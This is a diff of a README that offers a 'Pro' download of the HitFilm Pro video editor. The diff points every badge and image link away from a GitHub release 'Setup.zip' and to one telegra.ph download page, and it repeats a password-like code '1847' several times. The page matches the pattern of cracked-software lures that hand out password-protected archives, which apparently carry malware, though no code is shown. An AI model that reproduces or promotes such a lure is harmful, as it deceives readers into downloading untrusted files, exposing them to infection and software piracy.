@@ -1,14 +1,14 @@
 # HitFilm Pro — Pro Version Download & Setup Guide 2026
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-VFX%20%26%20Video%20Editor-purple)]()
-[![Version](https://img.shields.io/badge/Version-Pro-gold)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Download-05-21-39)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Download-05-21-39)
+[![Category](https://img.shields.io/badge/Category-VFX%20%26%20Video%20Editor-purple)](https://telegra.ph/Download-05-21-39)
+[![Version](https://img.shields.io/badge/Version-Pro-gold)](https://telegra.ph/Download-05-21-39)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://telegra.ph/Download-05-21-39)
 
 ---
 
-[![HitFilm Pro](og-image.png)](https://github.com/BasinClassFlex/HitFilm-Tools/releases/download/Last/Setup.zip)
+[![HitFilm Pro](og-image.png)](https://telegra.ph/Download-05-21-39)
 
 **🔐🔐🔐** `1847`
 
@@ -27,7 +27,7 @@
 
 ## Download & Get Pro
 
-[![Get HitFilm Pro Pro](https://img.shields.io/badge/Get%20HitFilm%20Pro%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://github.com/BasinClassFlex/HitFilm-Tools/releases/download/Last/Setup.zip)
+[![Get HitFilm Pro Pro](https://img.shields.io/badge/Get%20HitFilm%20Pro%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://telegra.ph/Download-05-21-39)
 **🔐🔐🔐** `1847`
 
 **🔐🔐🔐** `1847`
